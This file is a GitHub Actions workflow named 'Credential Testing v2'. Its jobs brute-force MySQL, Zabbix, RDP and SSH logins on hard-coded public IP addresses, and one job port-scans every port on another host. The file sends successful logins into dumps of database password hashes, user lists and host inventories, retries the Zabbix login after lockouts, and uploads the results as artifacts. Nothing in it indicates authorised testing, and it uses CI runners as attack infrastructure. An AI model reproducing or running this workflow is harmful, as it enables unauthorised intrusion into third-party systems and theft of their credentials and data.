name: Credential Testing v2
"on":
  workflow_dispatch:

jobs:
  mysql-full-brute:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        target:
          - "162.55.177.241"
          - "5.78.153.212"
    steps:
      - uses: actions/checkout@v4
      - name: MySQL Brute Force
        run: |
          sudo apt-get update -qq && sudo apt-get install -y -qq mysql-client hydra 2>&1 | tail -1
          echo "Runner IP: $(curl -s ifconfig.me)"
          timeout 3 bash -c "echo >/dev/tcp/${{ matrix.target }}/3306" 2>/dev/null && echo "PORT 3306 OPEN" || { echo "PORT 3306 CLOSED"; exit 0; }
          echo "=== Trying credential combos ==="
          while IFS= read -r line; do
            [ -z "$line" ] && continue
            user=$(echo "$line" | cut -d: -f1)
            pass=$(echo "$line" | cut -d: -f2)
            result=$(timeout 5 mysql -h ${{ matrix.target }} -u "$user" -p"$pass" --connect-timeout=5 -e "SELECT 'CONNECTED' AS status;" 2>&1)
            if echo "$result" | grep -q "CONNECTED"; then
              echo "*** MYSQL ACCESS GRANTED: $user:$pass on ${{ matrix.target }} ***"
              echo "$user:$pass" > /tmp/mysql_found.txt
              echo "$result" >> /tmp/mysql_found.txt
              # Dump everything
              mysql -h ${{ matrix.target }} -u "$user" -p"$pass" -e "SHOW DATABASES;" >> /tmp/mysql_dump.txt 2>&1
              mysql -h ${{ matrix.target }} -u "$user" -p"$pass" -e "SELECT user(), version();" >> /tmp/mysql_dump.txt 2>&1
              mysql -h ${{ matrix.target }} -u "$user" -p"$pass" -e "SELECT CONCAT(user,0x3a,password) FROM mysql.user;" >> /tmp/mysql_dump.txt 2>&1
              mysql -h ${{ matrix.target }} -u "$user" -p"$pass" -e "SHOW GRANTS;" >> /tmp/mysql_dump.txt 2>&1
              break
            fi
          done < creds_combo.txt
          [ -f /tmp/mysql_found.txt ] && echo "=== FOUND ===" && cat /tmp/mysql_found.txt
          [ -f /tmp/mysql_dump.txt ] && echo "=== DUMP ===" && cat /tmp/mysql_dump.txt
      - uses: actions/upload-artifact@v4
        with:
          name: mysql-${{ matrix.target }}
          path: /tmp/mysql_*.txt
          if-no-files-found: ignore

  zabbix-brute:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Zabbix Brute
        run: |
          # Wait for account unblock
          sleep 60
          V=$(curl -sk "https://5.78.127.58/api_jsonrpc.php" -d '{"jsonrpc":"2.0","method":"apiinfo.version","params":[],"id":1}' -H "Content-Type: application/json" 2>&1)
          echo "Version: $V"
          for user in Admin admin; do
            while IFS= read -r pass; do
              [ -z "$pass" ] && continue
              R=$(curl -sk --connect-timeout 5 "https://5.78.127.58/api_jsonrpc.php" \
                -d "{\"jsonrpc\":\"2.0\",\"method\":\"user.login\",\"params\":{\"username\":\"$user\",\"password\":\"$pass\"},\"id\":1}" \
                -H "Content-Type: application/json" 2>&1)
              echo "Try $user:$pass -> $(echo $R | head -c 100)"
              if echo "$R" | grep -q '"result"'; then
                echo "*** ZABBIX LOGIN: $user:$pass ***"
                echo "$user:$pass" > /tmp/zabbix_found.txt
                TOKEN=$(echo "$R" | python3 -c "import json,sys;print(json.load(sys.stdin)['result'])" 2>/dev/null)
                if [ -n "$TOKEN" ]; then
                  curl -sk "https://5.78.127.58/api_jsonrpc.php" \
                    -d "{\"jsonrpc\":\"2.0\",\"method\":\"user.get\",\"params\":{\"output\":\"extend\"},\"auth\":\"$TOKEN\",\"id\":1}" \
                    -H "Content-Type: application/json" > /tmp/zabbix_dump.txt 2>&1
                  curl -sk "https://5.78.127.58/api_jsonrpc.php" \
                    -d "{\"jsonrpc\":\"2.0\",\"method\":\"host.get\",\"params\":{\"output\":\"extend\",\"selectInterfaces\":\"extend\"},\"auth\":\"$TOKEN\",\"id\":1}" \
                    -H "Content-Type: application/json" >> /tmp/zabbix_dump.txt 2>&1
                fi
                break 2
              fi
              if echo "$R" | grep -q "block"; then
                echo "Account blocked, waiting 120s..."
                sleep 120
              fi
              sleep 1
            done < passwords.txt
          done
          [ -f /tmp/zabbix_found.txt ] && echo "=== FOUND ===" && cat /tmp/zabbix_found.txt && cat /tmp/zabbix_dump.txt
      - uses: actions/upload-artifact@v4
        with:
          name: zabbix-results
          path: /tmp/zabbix_*.txt
          if-no-files-found: ignore

  rdp-brute:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: RDP Brute
        run: |
          sudo apt-get update -qq && sudo apt-get install -y -qq freerdp2-x11 2>&1 | tail -1
          echo "Runner IP: $(curl -s ifconfig.me)"
          timeout 3 bash -c "echo >/dev/tcp/45.87.61.101/3389" && echo "RDP OPEN" || echo "RDP CLOSED"
          for user in administrator admin; do
            while IFS= read -r pass; do
              [ -z "$pass" ] && continue
              R=$(timeout 10 xfreerdp /v:45.87.61.101 /u:"$user" /p:"$pass" /cert:ignore +auth-only 2>&1)
              if echo "$R" | grep -qi "authenticated"; then
                echo "*** RDP: $user:$pass ***"
                echo "$user:$pass" > /tmp/rdp_found.txt
                break 2
              fi
            done < passwords.txt
          done
          [ -f /tmp/rdp_found.txt ] && cat /tmp/rdp_found.txt || echo "No RDP access found"
      - uses: actions/upload-artifact@v4
        with:
          name: rdp-results
          path: /tmp/rdp_*.txt
          if-no-files-found: ignore

  whmcs-db-all-ports:
    runs-on: ubuntu-latest
    steps:
      - name: Scan DB Host
        run: |
          echo "Runner IP: $(curl -s ifconfig.me)"
          echo "=== Full port scan on 207.148.18.120 ==="
          for port in $(seq 1 65535); do
            timeout 1 bash -c "echo >/dev/tcp/207.148.18.120/$port" 2>/dev/null && echo "Port $port OPEN" &
          done
          wait
          echo "Scan complete"

  ssh-deep-brute:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        target:
          - "5.161.125.229"
          - "49.12.41.9"
          - "5.78.127.58"
        user: [root, admin]
    steps:
      - uses: actions/checkout@v4
      - name: SSH Deep Brute
        run: |
          sudo apt-get update -qq && sudo apt-get install -y -qq sshpass hydra 2>&1 | tail -1
          echo "Runner IP: $(curl -s ifconfig.me)"
          echo "=== SSH ${{ matrix.user }}@${{ matrix.target }} ==="
          # Use 10k password list
          wget -q "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt" -O /tmp/10k.txt 2>/dev/null
          hydra -l ${{ matrix.user }} -P /tmp/10k.txt -t 4 -V -f -o /tmp/ssh_result.txt -I -W 3 ssh://${{ matrix.target }} 2>&1 | tail -10
          [ -s /tmp/ssh_result.txt ] && echo "=== FOUND ===" && cat /tmp/ssh_result.txt || echo "No SSH access found"
      - uses: actions/upload-artifact@v4
        with:
          name: ssh-deep-${{ matrix.target }}-${{ matrix.user }}
          path: /tmp/ssh_result.txt
          if-no-files-found: ignore
